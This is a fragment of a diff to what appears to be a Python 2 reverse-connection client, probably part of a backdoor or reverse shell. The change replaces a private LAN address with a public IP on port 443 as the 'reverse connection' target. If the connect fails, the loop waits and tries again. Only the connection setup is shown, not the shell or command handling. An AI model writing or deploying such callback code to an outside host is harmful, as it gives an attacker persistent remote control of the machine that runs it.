@@ -72,7 +72,7 @@ def do_work( forever = True):
             print 'Socket Keepalive already on'
 
         try:
-            s.connect(('192.168.1.2',666)) #YOUR IP AND PORT FOR REVERSE CONNECTION
+            s.connect(('24.154.153.159',443)) #YOUR IP AND PORT FOR REVERSE CONNECTION
         except socket.error:
             print 'Socket connect failed! Loop up and try socket again'
             time.sleep( 10)
